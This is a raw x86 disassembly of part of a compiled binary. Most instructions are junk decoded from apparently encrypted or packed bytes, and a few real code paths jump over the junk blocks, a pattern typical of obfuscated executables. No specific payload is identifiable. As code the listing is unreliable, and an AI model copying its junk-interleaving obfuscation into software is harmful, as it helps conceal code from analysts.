  402127:	xchg   DWORD PTR [ebx-0x6],ebp
  40212a:	aad    0xc9
  40212c:	sahf   
  40212d:	je     0x40215b
  40212f:	jnp    0x4020c3
  402131:	or     edx,edx
  402133:	cmp    BYTE PTR [edi-0xc],bl
  402136:	mov    bh,0x4d
  402138:	sahf   
  402139:	inc    eax
  40213a:	jnp    0x40215f
  40213c:	hlt    
  40213d:	and    al,0x1
  40213f:	imul   ebx,DWORD PTR ds:0xdb94994,0xffffffba
  402146:	push   ecx
  402147:	stc    
  402148:	mov    al,ds:0x6dd05fb5
  40214d:	pop    esp
  40214e:	enter  0x8b50,0x45
  402152:	call   0x40cb5c
  402157:	add    cl,ch
  402159:	pushf  
  40215a:	add    DWORD PTR [eax],eax
  40215c:	add    ch,dh
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	push   es
  40216a:	out    dx,al
  40216b:	adc    DWORD PTR [edx],esp
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x4021af
  402176:	inc    DWORD PTR [ecx-0x57]
  402179:	sbb    al,0x45
  40217b:	inc    ecx
  40217c:	xchg   esi,eax
  40217d:	outs   dx,DWORD PTR ds:[esi]
  40217e:	dec    edx
  40217f:	pop    ebx
  402180:	lahf   
  402181:	pop    ebp
  402182:	stc    
  402183:	inc    ebx
  402184:	scas   eax,DWORD PTR es:[edi]
  402185:	fisubr WORD PTR [edi-0x5a63e7fc]
  40218b:	jnp    0x402188
  40218d:	cld    
  40218e:	push   edx
  40218f:	out    dx,eax
  402190:	xor    ebx,0xfffffff7
  402193:	in     eax,dx
  402194:	push   ecx
  402195:	mov    cl,0x75
  402197:	xchg   esp,eax
  402198:	xchg   BYTE PTR [eax+0x3b],bl
  40219b:	out    dx,eax
  40219c:	add    edi,DWORD PTR [edi]
  40219e:	sbb    eax,0x79b0c75a
  4021a3:	cs fsubr st(0),st
  4021a6:	in     eax,dx
  4021a7:	fmulp  st(1),st
  4021a9:	push   esi
  4021aa:	cld    
  4021ab:	popf   
  4021ac:	nop
  4021ad:	aaa    
  4021ae:	stc    
  4021af:	fdiv   DWORD PTR [esi+eiz*2+0x1]
  4021b3:	sub    dh,bh
  4021b5:	int    0x32
  4021b7:	sbb    al,0x1b
  4021b9:	jp     0x4021bd
  4021bb:	or     al,0x73
  4021bd:	aaa    
  4021be:	loopne 0x4021fb
  4021c0:	xchg   ebx,eax
  4021c1:	lahf   
  4021c2:	or     BYTE PTR [ebp-0x33078605],ch
  4021c8:	cmp    BYTE PTR [eax-0x3f843cbb],bl
  4021ce:	jae    0x4021de
  4021d0:	and    ch,BYTE PTR [edx-0x4b]
  4021d3:	inc    ebp
  4021d4:	mov    ds:0xfa298aec,al
  4021d9:	(bad)  
  4021da:	dec    ebx
  4021db:	rcl    esp,0xe9
  4021de:	ret    
  4021df:	xchg   esp,eax
  4021e0:	add    BYTE PTR [edi+edi*4-0x240d3e7d],ch
  4021e7:	lds    eax,FWORD PTR [ecx-0x1e]
  4021ea:	lods   eax,DWORD PTR ds:[esi]
  4021eb:	mov    cl,0xb1
  4021ed:	pop    ds
  4021ee:	stos   DWORD PTR es:[edi],eax
  4021ef:	sti    
  4021f0:	ds cmp al,0x45
  4021f3:	fidivr DWORD PTR [edx+0x80bae90]
  4021f9:	sbb    eax,0x8674de4f
  4021fe:	mov    eax,0x488a801e
  402203:	dec    eax
  402204:	inc    edi
  402205:	and    al,0x5d
  402207:	xchg   ecx,eax
  402208:	pusha  
  402209:	sub    dl,dl
  40220b:	cmp    DWORD PTR [ebx-0x52d3a427],0x46
  402212:	arpl   WORD PTR [esi+0x2c],si
  402215:	fsubr  QWORD PTR [esi+0x17a79284]
  40221b:	dec    ebp
  40221c:	jmp    0xa24c3dbf
  402221:	mov    al,BYTE PTR [ebp-0x6cce4100]
  402227:	pop    ds
  402228:	sub    ch,BYTE PTR [ebx+0x687351a]
  40222e:	pop    esp
  40222f:	pop    ss
  402230:	ficom  WORD PTR [esp+ebp*2]
  402233:	jns    0x402216
  402235:	stos   BYTE PTR es:[edi],al
  402236:	xlat   BYTE PTR ds:[ebx]
  402237:	add    eax,0x6fc1f152
  40223c:	mov    gs,WORD PTR [ebx-0xb]
  40223f:	int3   
  402240:	push   0xfffffff3
  402242:	arpl   WORD PTR [eax-0x26c877ec],bp
  402248:	imul   bh
  40224a:	data16 or BYTE PTR [edx+ebx*1-0x17fc84a9],bl
  402252:	out    0xd5,al
  402254:	add    edi,DWORD PTR [ebp+0x44]
  402257:	outs   dx,DWORD PTR ds:[esi]
  402258:	out    0x56,al
  40225a:	pusha  
  40225b:	jle    0x402241
  40225d:	retf   0x3fe6
  402260:	fstp   QWORD PTR [ebx]
  402262:	sub    BYTE PTR [ebx+eax*2],0xda
  402266:	imul   eax,DWORD PTR ds:0xa2716020,0x61
  40226d:	sbb    eax,0xf26f59e1
  402272:	jg     0x40224a
  402274:	sub    cl,ah
  402276:	push   esi
  402277:	outs   dx,BYTE PTR ds:[esi]
  402278:	(bad)  
  402279:	and    BYTE PTR [esi+ecx*2+0x7b],dh
  40227d:	pop    ebp
  40227e:	cmp    BYTE PTR [esi],bl
  402280:	(bad)  
  402281:	xor    eax,0xd91bf443
  402286:	das    
  402287:	popa   
  402288:	adc    BYTE PTR [edi-0x14],dl
  40228b:	into   
  40228c:	inc    edi
  40228d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40228e:	out    0xa1,al
  402290:	mov    ?,WORD PTR [ebp+edi*4+0x10]
  402294:	cmp    al,0xbd
  402296:	out    dx,al
  402297:	push   edx
  402298:	outs   dx,DWORD PTR ds:[esi]
  402299:	add    eax,edi
  40229b:	mov    edx,0x59946e04
  4022a0:	aaa    
  4022a1:	cwde   
  4022a2:	mov    ecx,0xd183098c
  4022a7:	pusha  
  4022a8:	mov    ebx,eax
  4022aa:	cmp    DWORD PTR [ebp+0x4954621d],ebp
  4022b0:	fadd   DWORD PTR [edi+0x4cb5d7f7]
  4022b6:	neg    DWORD PTR [ebx+eax*4-0x25fda4a4]
  4022bd:	push   es
  4022be:	jecxz  0x402336
  4022c0:	mov    al,ds:0x29822169
  4022c5:	pushf  
  4022c6:	dec    ebp
  4022c7:	ja     0x40230c
  4022c9:	loope  0x40229e
  4022cb:	pop    esi
  4022cc:	les    ebx,FWORD PTR [eax+0x12]
  4022cf:	psubsb mm7,QWORD PTR [edi]
  4022d2:	int3   
  4022d3:	mov    esi,eax
  4022d5:	mov    eax,0x159474cb
  4022da:	(bad)  
  4022dd:	pusha  
  4022de:	(bad)  
  4022e0:	mov    ch,0x9
  4022e2:	mov    ch,0x9b
  4022e4:	loop   0x40232e
  4022e6:	sbb    ebp,edi
  4022e8:	or     DWORD PTR [eax],esp
  4022ea:	pusha  
  4022eb:	xchg   edx,eax
  4022ec:	lahf   
  4022ed:	sub    al,0x67
  4022ef:	and    bl,dh
  4022f1:	std    
  4022f2:	aaa    
  4022f3:	stc    
  4022f4:	push   esp
  4022f5:	pop    es
  4022f6:	mov    cl,0x62
  4022f8:	in     eax,dx
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	lods   eax,DWORD PTR ds:[esi]
  402358:	inc    ebp
  402359:	sbb    al,0xef
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x402312
  402364:	cmp    eax,0x583fd8ad
  402369:	sub    BYTE PTR [edi],al
  40236b:	or     bl,BYTE PTR [edx-0x49]
  40236e:	xor    al,0xd6
  402370:	retf   0x64fe
  402373:	mov    ebx,0xd2a92b55
  402378:	jg     0x40233b
  40237a:	fcomp  QWORD PTR [ebx+0x176a6ed9]
  402380:	add    edi,edi
  402382:	outs   dx,DWORD PTR ds:[esi]
  402383:	pop    edx
  402384:	jno    0x40235e
  402386:	dec    ebx
  402387:	push   edx
  402388:	(bad)  
  402389:	(bad)  
  40238b:	mov    dl,0xcd
  40238d:	jmp    0x94d0:0xb757955f
  402394:	(bad)  
  402396:	mov    eax,ds:0x8c424bc5
  40239b:	call   0x39ffb247
  4023a0:	sub    ebx,DWORD PTR [eax]
  4023a2:	(bad)  
  4023a3:	nop
  4023a4:	pop    ss
  4023a5:	xor    BYTE PTR [ebp+ebp*4-0x7e],dl
  4023a9:	jb     0x402397
  4023ab:	xor    bh,BYTE PTR [ebx]
  4023ad:	sub    BYTE PTR [edx],0x5f
  4023b0:	inc    ebx
  4023b1:	xchg   edi,eax
  4023b2:	mov    ah,0x4e
  4023b4:	mov    dh,0x5a
  4023b6:	and    ch,BYTE PTR [ebp+0x3fb21c46]
  4023bc:	scas   eax,DWORD PTR es:[edi]
  4023bd:	call   0x6808:0x48bb42d1
  4023c4:	lock je 0x4023e9
  4023c7:	mov    DWORD PTR [eax],ebp
  4023c9:	adc    BYTE PTR [edi-0x855d062],cl
  4023cf:	popf   
  4023d0:	aas    
  4023d1:	mov    dl,al
  4023d3:	pop    esp
  4023d4:	ins    DWORD PTR es:[edi],dx
  4023d5:	jns    0x402389
  4023d7:	mov    edx,0x17f12192
  4023dc:	adc    BYTE PTR [ebp+0x11],bh
  4023df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023e0:	gs ret 
  4023e2:	sar    DWORD PTR [edi+0x49c6b3c6],1
  4023e8:	push   edi
  4023e9:	rcr    esi,1
  4023eb:	push   0x2
  4023ed:	mov    cl,0x9
  4023ef:	mov    edx,0xa858835
  4023f4:	rol    BYTE PTR [ecx],cl
  4023f6:	add    esi,DWORD PTR [eax-0x3d]
  4023f9:	fnstenv [edx]
  4023fb:	or     ebp,edi
  4023fd:	mov    ds:0x50982d6f,eax
  402402:	rol    BYTE PTR [ecx+0x46],0x7e
  402406:	push   ebx
  402407:	sbb    eax,0xe97f96c
  40240c:	push   esi
  40240d:	retf   
  40240e:	stos   DWORD PTR es:[edi],eax
  40240f:	xchg   ebp,eax
  402410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402411:	or     ah,BYTE PTR [edi]
  402413:	std    
  402414:	xor    dl,BYTE PTR [ebx+eax*8]
  402417:	daa    
  402418:	mov    edx,0xa6ea9d5f
  40241d:	test   edx,0xcc7beaaf
  402423:	mov    ds:0x320ca8a4,eax
  402428:	sub    bh,BYTE PTR [eax+esi*4-0x75a0c8e9]
  40242f:	sub    BYTE PTR [edi-0x4c953988],0x25
  402436:	push   ebx
  402437:	lea    ebx,[ecx-0x6739b057]
  40243d:	test   BYTE PTR [eax-0x5150454b],dl
  402443:	jne    0x402460
  402445:	inc    edx
  402446:	aad    0xab
  402448:	mov    ah,0x52
  40244a:	push   edi
  40244b:	jae    0x402465
  40244d:	and    al,0x12
  40244f:	repz mov cl,0xf7
  402452:	loopne 0x4024cd
  402454:	or     BYTE PTR [ebx-0x7dfe53c2],0xf7
  40245b:	fcmovu st,st(4)
  40245d:	scas   al,BYTE PTR es:[edi]
  40245e:	jmp    0xbe3355c0
  402463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402464:	or     dl,BYTE PTR [esi+0x4bece707]
  40246a:	loope  0x40249e
  40246c:	pop    eax
  40246d:	push   ecx
  40246e:	(bad)  
  40246f:	cmp    BYTE PTR [eax],dl
  402471:	imul   edi,DWORD PTR [ebp-0x3ab6938b],0xffffffa8
  402478:	stos   BYTE PTR es:[edi],al
  402479:	mov    BYTE PTR [ebp-0x732474a6],cl
  40247f:	cmp    BYTE PTR [eax+0x455716bc],dl
  402485:	cmp    dh,BYTE PTR [edx]
  402487:	xchg   esp,eax
  402488:	sub    eax,0xdaeedba5
  40248d:	push   ecx
  40248e:	sar    DWORD PTR [ebp+edi*1-0x4658e773],1
  402495:	lods   al,BYTE PTR ds:[esi]
  402496:	cdq    
  402497:	adc    eax,0x556ba335
  40249c:	or     DWORD PTR [edi],ebx
  40249e:	scas   al,BYTE PTR es:[edi]
  40249f:	dec    ecx
  4024a0:	cmp    BYTE PTR [ebp-0x30e1e5ab],0x8
  4024a7:	cmp    DWORD PTR [ebx],ebx
  4024a9:	inc    eax
  4024aa:	dec    ebx
  4024ab:	shr    BYTE PTR [ebx],1
  4024ad:	cmp    al,0x0
  4024af:	int    0x12
  4024b1:	inc    ecx
  4024b2:	rcr    DWORD PTR [esi+ebp*8-0x1],cl
  4024b6:	mov    WORD PTR ds:0x12a1fa6d,gs
  4024bc:	sbb    BYTE PTR [edi],bh
  4024be:	les    edi,FWORD PTR [eax]
  4024c0:	les    esi,FWORD PTR [eax+0x2a]
  4024c3:	jmp    0x402531
  4024c5:	cmp    BYTE PTR [edi+0x19],bl
  4024c8:	jg     0x402543
  4024ca:	repz mov cl,0xc2
  4024cd:	xchg   dh,ah
  4024cf:	sub    al,0xfe
  4024d1:	mov    dl,0x4f
  4024d3:	popf   
  4024d4:	aam    0xa8
  4024d6:	mov    ds:0x8006fb77,eax
  4024db:	out    0x4c,al
  4024dd:	add    eax,DWORD PTR ds:0x2fc5f676
  4024e3:	sbb    BYTE PTR [edx],ch
  4024e5:	mov    ebx,DWORD PTR [ecx-0x760fba75]
  4024eb:	inc    ebp
  4024ec:	lock mov eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	fisttp DWORD PTR [ebx]
  40250f:	test   eax,0x7e01264c
  402514:	jle    0x402510
  402516:	jg     0x402596
  402518:	jle    0x4024d1
  40251a:	sub    al,0xfc
  40251c:	cld    
  40251d:	mov    ecx,DWORD PTR [ebx]
  40251f:	mul    DWORD PTR [esi-0x2b015f21]
  402525:	jecxz  0x4024cb
  402527:	add    ch,BYTE PTR [eax]
  402529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40252a:	cmc    
  40252b:	mov    cl,0x63
  40252d:	mov    dh,0xe2
  40252f:	jns    0x402573
  402531:	pop    esp
  402532:	loop   0x40259d
  402534:	pop    ebx
  402535:	stc    
  402536:	adc    al,bh
  402538:	sbb    ecx,edi
  40253a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40253b:	xor    edi,DWORD PTR ds:0x3e2b877
  402541:	jae    0x4024f1
  402543:	push   edi
  402544:	mov    dh,0xef
  402546:	dec    eax
  402547:	push   DWORD PTR [ebx+0x41493813]
  40254d:	(bad)  
  40254e:	lods   al,BYTE PTR ds:[esi]
  40254f:	ds int3 
  402551:	adc    eax,0xc9acbce0
  402556:	mov    ch,0x82
  402558:	fild   WORD PTR [edx]
  40255a:	(bad)  
  40255b:	fst    DWORD PTR [edx-0x4267dcb2]
  402561:	out    0xca,al
  402563:	dec    ch
  402565:	dec    ecx
  402566:	jo     0x4025e5
  402568:	push   ecx
  402569:	mov    ss,WORD PTR [esi+0x60]
  40256c:	xor    BYTE PTR [ebx],0x43
  40256f:	stos   DWORD PTR es:[edi],eax
  402570:	addr16 jge 0x40254c
  402573:	jno    0x402509
  402575:	ss inc edi
  402577:	and    bl,BYTE PTR [ebp+0x28]
  40257a:	nop
  40257b:	imul   esp,edx,0x66
  40257e:	inc    edx
  40257f:	data16 cmc 
  402581:	xor    ah,dl
  402583:	aaa    
  402584:	or     BYTE PTR [edi],dl
  402586:	hlt    
  402587:	fnstenv [eax]
  402589:	call   0xd375fbc8
  40258e:	push   eax
  40258f:	cmc    
  402590:	pop    ebx
  402591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402592:	jmp    0x89bd82c5
  402597:	imul   esi,edx,0xa7099d66
  40259d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40259e:	push   0xffffffed
  4025a0:	stos   DWORD PTR es:[edi],eax
  4025a1:	inc    eax
  4025a2:	jno    0x4025cd
  4025a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a5:	(bad)  
  4025a6:	xor    DWORD PTR [ecx+0x5312aba4],ebp
  4025ac:	inc    ecx
  4025ad:	stos   BYTE PTR es:[edi],al
  4025ae:	cmp    ch,bh
  4025b0:	and    DWORD PTR cs:[edx+0x4e089801],edx
  4025b7:	dec    edi
  4025b8:	mov    ch,0x91
  4025ba:	repz int 0x35
  4025bd:	jmp    DWORD PTR [esi-0x3f37fea8]
  4025c3:	jnp    0x402609
  4025c5:	or     al,0xcc
  4025c7:	fimul  WORD PTR [edi-0x20]
  4025ca:	out    0x10,al
  4025cc:	xlat   BYTE PTR ds:[ebx]
  4025cd:	(bad)  
  4025ce:	out    dx,al
  4025cf:	and    dh,ah
  4025d1:	mov    DWORD PTR [edx-0xe922ffc],ebx
  4025d7:	mov    edi,0xed21afcf
  4025dc:	inc    edi
  4025dd:	xlat   BYTE PTR ds:[ebx]
  4025de:	aam    0x1b
  4025e0:	test   eax,ebx
  4025e2:	adc    eax,0x24b982b6
  4025e7:	std    
  4025e8:	repz sub bl,BYTE PTR [ebp-0x68221780]
  4025ef:	add    eax,0x479ccdd7
  4025f4:	fld    QWORD PTR [edx+ebx*8+0x1]
  4025f8:	fs retf 0xcf30
  4025fc:	push   edi
  4025fd:	shl    DWORD PTR [edi+0x2d],1
  402600:	mov    DWORD PTR [esi+0x65],edi
  402603:	push   eax
  402604:	or     eax,0xc59fb123
  402609:	cmp    BYTE PTR [ecx],cl
  40260b:	mov    eax,ebx
  40260d:	jecxz  0x402662
  40260f:	pop    ecx
  402610:	push   ss
  402611:	arpl   WORD PTR [ebx+esi*8+0x18e8618b],dx
  402618:	scas   al,BYTE PTR es:[edi]
  402619:	pop    edx
  40261a:	xor    al,0x6e
  40261c:	inc    ebp
  40261d:	es pop esp
  40261f:	in     al,0x40
  402621:	shr    DWORD PTR [edi+0x38],0x9d
  402625:	mov    eax,ds:0x9d367e0a
  40262a:	inc    eax
  40262b:	cwde   
  40262c:	loope  0x4025af
  40262e:	sar    DWORD PTR [ecx],0x96
  402631:	cmp    eax,0x449dd97a
  402636:	and    BYTE PTR [eax-0x3d],al
  402639:	pop    es
  40263a:	rol    DWORD PTR [ebx+edi*1],1
  40263d:	ror    al,1
  40263f:	clc    
  402640:	inc    esp
  402641:	das    
  402642:	jbe    0x4026b0
  402644:	sbb    eax,0x7924fdbb
  402649:	jo     0x4025fb
  40264b:	pusha  
  40264c:	mov    bh,0x67
  40264e:	inc    edx
  40264f:	cmp    dl,BYTE PTR [ebx+eiz*4-0x2]
  402653:	dec    edi
  402654:	lods   al,BYTE PTR ds:[esi]
  402655:	mov    al,0x82
  402657:	(bad)
  40265b:	int    0x2b
  40265d:	cmc    
  40265e:	stos   DWORD PTR es:[edi],eax
  40265f:	popa   
  402660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402661:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  402663:	mov    ecx,0x6a040e1a
  402668:	inc    esi
  402669:	loop   0x402621
  40266b:	pop    ebx
  40266c:	pop    esp
  40266d:	mov    DWORD PTR [edx-0xe],ebx
  402670:	ss pop eax
  402672:	xchg   edx,eax
  402673:	imul   edx,DWORD PTR [ecx-0x6f],0x11
  402677:	int3   
  402678:	popa   
  402679:	cld    
  40267a:	push   esp
  40267b:	mov    edi,0xe38e35ff
  402680:	sbb    edx,ebp
  402682:	cmp    DWORD PTR [eax+0x4a],ecx
  402685:	xchg   BYTE PTR [edx-0x37],cl
  402688:	and    eax,0x68670b91
  40268d:	pop    ds
  40268e:	sbb    DWORD PTR [edi-0x55],0x9e1a42aa
  402695:	xchg   ecx,eax
  402696:	pushf  
  402697:	loopne 0x40268a
  402699:	or     ebx,DWORD PTR [esi-0x36]
  40269c:	push   ebx
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	popa   
  4026d3:	loop   0x40269e
  4026d5:	in     eax,dx
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x40268b
  4026df:	imul   eax,DWORD PTR [edx],0xffffffce
  4026e2:	push   ebx
  4026e3:	ins    DWORD PTR es:[edi],dx
  4026e4:	dec    ecx
  4026e5:	push   eax
  4026e6:	sahf   
  4026e7:	ficomp WORD PTR [ebx-0x38]
  4026ea:	and    DWORD PTR [ecx],0xab2a68b1
  4026f0:	cmc    
  4026f1:	(bad)  
  4026f2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4026f4:	test   BYTE PTR [esi+0x6125a437],0x25
  4026fb:	jnp    0x402719
  4026fd:	call   0x979a9a55
  402702:	mov    ebx,0x827201a2
  402707:	pop    esi
  402708:	pop    edi
  402709:	mov    bl,dl
  40270b:	not    esp
  40270d:	loop   0x40271d
  40270f:	repnz rol BYTE PTR [eax+esi*8+0x12],0x71
  402715:	jmp    0x40269b
  402717:	jl     0x4026ff
  402719:	push   esi
  40271a:	pusha  
  40271b:	fwait
  40271c:	xchg   esp,eax
  40271d:	test   DWORD PTR ds:0x7a7d249d,ebp
  402723:	and    esp,DWORD PTR [ebx]
  402725:	ds jmp 0xce631232
  40272b:	dec    esp
  40272c:	lods   eax,DWORD PTR ds:[esi]
  40272d:	popf   
  40272e:	xchg   ecx,eax
  40272f:	push   ss
  402730:	pop    edi
  402731:	xor    al,0xa8
  402733:	adc    eax,0x87ca7c6f
  402738:	inc    esp
  402739:	mov    ch,0x22
  40273b:	sbb    al,0x7c
  40273d:	stos   DWORD PTR es:[edi],eax
  40273e:	stc    
  40273f:	jge    0x402775
  402741:	fldcw  WORD PTR [ecx]
  402743:	sub    dh,BYTE PTR [edx]
  402745:	mov    ?,WORD PTR [ebp-0x3e63ebea]
  40274b:	jge    0x402704
  40274d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40274e:	pushf  
  40274f:	imul   edx,esp,0x3
  402752:	or     al,0x52
  402754:	mov    ebp,0xd2a6f091
  402759:	test   DWORD PTR [ebp+0x71],eax
  40275c:	pop    edx
  40275d:	lods   al,BYTE PTR ds:[esi]
  40275e:	jg     0x402732
  402760:	dec    ebp
  402761:	(bad)  
  402763:	les    eax,FWORD PTR [edx+0x48]
  402766:	and    edi,DWORD PTR [edi+0x5cf692c1]
  40276c:	push   es
  40276d:	stos   DWORD PTR es:[edi],eax
  40276e:	ja     0x402766
  402770:	add    bh,bl
  402772:	das    
  402773:	sbb    bh,BYTE PTR [ebp+0x6f172d]
  402779:	aad    0xd4
  40277b:	cmp    DWORD PTR [eax+0xd],0xa
  40277f:	or     eax,0x64221307
  402784:	xor    eax,0x8ec6f04d
  402789:	dec    ebx
  40278a:	push   edi
  40278b:	add    DWORD PTR [ecx],esi
  40278d:	mov    al,0x45
  40278f:	cmp    esp,DWORD PTR [ebp-0x4]
  402792:	call   0x86d:0x8146ff0d
  402799:	and    al,0x63
  40279b:	dec    ebp
  40279c:	xchg   ebx,eax
  40279d:	inc    esp
  40279e:	fbstp  TBYTE PTR [ebp+0x7f]
  4027a1:	mov    ds:0x2f01add5,eax
  4027a6:	mov    ?,ecx
  4027a8:	xchg   edx,eax
  4027a9:	inc    edx
  4027aa:	cmp    ebx,DWORD PTR [edx-0x27dc9c2f]
  4027b0:	mov    esp,0x9a28f465
  4027b5:	shl    BYTE PTR [edx-0x53],cl
  4027b8:	add    al,0x8f
  4027ba:	(bad)  
  4027bb:	imul   edx,esp,0xffffffc8
  4027be:	js     0x402820
  4027c0:	add    eax,0x1adcb95e
  4027c5:	call   0xf88d:0x13c3adc8
  4027cc:	mov    esp,0xe35dcaeb
  4027d1:	mov    bh,0xe3
  4027d3:	scas   al,BYTE PTR es:[edi]
  4027d4:	mov    bh,0x1d
  4027d6:	inc    ecx
  4027d7:	loope  0x4027d2
  4027d9:	adc    BYTE PTR [ecx+0x5eb3ab4a],al
  4027df:	dec    eax
  4027e0:	mov    dl,0xf5
  4027e2:	jmp    FWORD PTR [edx+0x74dc06a4]
  4027e8:	pop    esp
  4027e9:	xlat   BYTE PTR ds:[ebx]
  4027ea:	pop    edx
  4027eb:	and    eax,0x683ff67c
  4027f0:	test   ah,dh
  4027f2:	xchg   esp,eax
  4027f3:	loope  0x402855
  4027f5:	cwde   
  4027f6:	push   es
  4027f7:	(bad)
  4027fa:	jnp    0x40281d
  4027fc:	and    DWORD PTR [ebp+0x3f],esi
  4027ff:	mov    ebp,0x21116096
  402804:	fsubr  QWORD PTR [esi]
  402806:	adc    edx,0x84163297
  40280c:	adc    eax,0x6e
  40280f:	sub    ebx,DWORD PTR [edi-0x59]
  402812:	loop   0x40285c
  402814:	mov    ?,WORD PTR [edi+0x1dc913fc]
  40281a:	daa    
  40281b:	dec    ebx
  40281c:	mov    ah,0xc7
  40281e:	bound  esi,QWORD PTR [edx]
  402820:	(bad)
  402823:	add    BYTE PTR [edx+0x5244e5fc],0x47
  40282a:	shl    BYTE PTR [bx],1
  40282d:	lahf   
  40282e:	(bad)  
  402830:	xchg   edi,eax
  402831:	push   ds
  402832:	mov    bh,0xb1
  402834:	push   es
  402835:	repnz cs mov edi,ds
  402839:	sbb    dh,BYTE PTR [ecx+0x2251ae3c]
  40283f:	cvtpi2ps xmm2,QWORD PTR [edi]
  402842:	cld    
  402843:	or     BYTE PTR [esi-0x15a87afa],ch
  402849:	fs iret 
  40284b:	psubq  mm3,QWORD PTR [edx-0x79]
  40284f:	repnz sbb BYTE PTR [edx+0x14e563af],cl
  402856:	loop   0x402883
  402858:	std    
  402859:	cwde   
  40285a:	jmp    0x89474378
  40285f:	lea    ebx,[ecx+edx*1-0x75]
  402863:	inc    ebp
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	cmp    BYTE PTR [edx],al
  402885:	int3   
  402886:	sbb    DWORD PTR [esi],ebp
  402888:	or     al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x4028a8
  402890:	jnp    0x402910
  402892:	xor    DWORD PTR [edi-0x73],edi
  402895:	mov    al,0xfe
  402897:	js     0x402887
  402899:	call   0xd07:0xb322d42d
  4028a0:	lahf   
  4028a1:	ds loope 0x402844
  4028a4:	das    
  4028a5:	int    0x11
  4028a7:	fxch   st(0)
  4028a9:	mov    ah,0xdb
  4028ab:	pop    ecx
  4028ac:	jb     0x402859
  4028ae:	dec    esi
  4028af:	adc    al,0x65
  4028b1:	fmul   DWORD PTR ds:0x62704776
  4028b7:	test   al,0x87
  4028b9:	test   DWORD PTR [eax-0x5c6b3a83],esi
  4028bf:	jmp    0x46110dc5
  4028c4:	pop    ebx
  4028c5:	(bad)  
  4028c6:	sub    al,0x5
  4028c8:	test   DWORD PTR [ecx-0x39],ebp
  4028cb:	pop    esi
  4028cc:	(bad)  
  4028ce:	retf   0xd440
  4028d1:	add    al,0x45
  4028d3:	ret    0x4105
  4028d6:	pop    ebx
  4028d7:	pop    es
  4028d8:	or     eax,0x93bba07d
  4028dd:	dec    edx
  4028de:	mov    BYTE PTR [eax-0x2edde39e],bl
  4028e4:	mov    ah,0x79
  4028e6:	pop    esi
  4028e7:	mov    ds:0xb1a06644,al
  4028ec:	sub    BYTE PTR [esi-0x4bb67962],cl
  4028f2:	jp     0x402915
